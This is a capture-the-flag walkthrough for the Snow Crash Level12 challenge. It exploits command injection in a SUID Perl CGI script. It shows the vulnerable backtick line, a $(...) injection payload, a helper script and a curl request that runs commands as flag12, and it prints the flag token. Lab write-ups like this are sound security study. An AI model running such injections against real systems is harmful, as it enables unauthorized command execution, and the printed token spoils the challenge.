# Level12 – Snow Crash (Bonus Level)

## 🔐 Goal

The goal is to exploit the `level12.pl` SUID Perl CGI script running on port `4646` to retrieve the flag owned by `flag12`.

---

## 🔍 Initial Observations

Upon logging in as `level12`, we find the following file:

```bash
$ ls -l
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
The script is SUID, meaning it runs as flag12.

Running the script manually:

./level12.pl
Content-type: text/html

..
The script is also accessible via HTTP on http://localhost:4646.

📜 Source Code Review
Here is a snippet from the script:

@output = `egrep "^$xx" /tmp/xd 2>&1`;
This line is vulnerable to command injection via user input, specifically through the x parameter in the URL. It uses shell backticks and directly includes unescaped input from x.

⚠️ Vulnerability
We control the x parameter passed to this shell command:

egrep "^$xx" /tmp/xd
So we can inject a payload like:

x=$(command)
The shell will execute command and substitute its output in the final egrep call. Since the script runs as flag12, any command we inject runs with those privileges.

🧪 Exploitation Strategy
To simplify the exploit, we write our desired command (getflag) into a separate shell script and execute it via $(...) injection.

✅ Step 1: Create a helper script

$ vi /tmp/GETFLAG.SH
Contents:

#!/bin/bash
/bin/getflag > /tmp/flag12
Make it executable:

$ chmod +x /tmp/GETFLAG.SH
✅ Step 2: Inject the payload via HTTP
Use curl to trigger the script:

$ curl 'http://127.0.0.1:4646/?x=$(/*/GETFLAG.SH)'
This results in the shell executing:

/tmp/GETFLAG.SH
The getflag command is executed as flag12, and its output is saved to /tmp/flag12.

✅ Step 3: Retrieve the flag

$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr